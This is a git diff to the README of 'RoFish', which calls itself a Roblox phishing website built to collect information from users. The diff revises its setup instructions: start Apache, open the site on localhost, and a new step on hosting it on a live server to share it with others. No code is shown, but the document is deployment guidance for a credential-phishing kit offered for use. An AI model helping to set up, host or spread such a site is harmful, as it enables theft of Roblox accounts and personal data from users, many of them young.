@@ -43,9 +43,11 @@ RoFish website is a Roblox phishing site designed to collect informations from u
    - On Linux, run `sudo systemctl start apache2` or `service apache2 start` in the terminal to start the built-in Apache server.
    - Note: Need to configure the directory as necessary.
 
-3. **Open the Website**: After Apache is running, open the `index.html` file in a browser.
+3. **Open the Website**: After Apache is running, type `localhost` in a browser.
 
-4. **Requirements**: There are no additional requirements. The website uses native HTML, CSS, and JavaScript. Ensure you have an active internet connection for third-party resources like FontAwesome and jQuery.
+4. **Hosting the Website**: If you wish to share the website with others, you will need to host it on a live server.
+
+5. **Requirements**: There are no additional requirements. The website uses native HTML, CSS, and JavaScript. Ensure you have an active internet connection for third-party resources like FontAwesome and jQuery.
 
 ##  ❓ <b>Wiki</b>
 - [Setting up RoFish](https://github.com/TheSisco/RoFish/wiki/Setting-Up-RoFish "RoFish - Wiki")
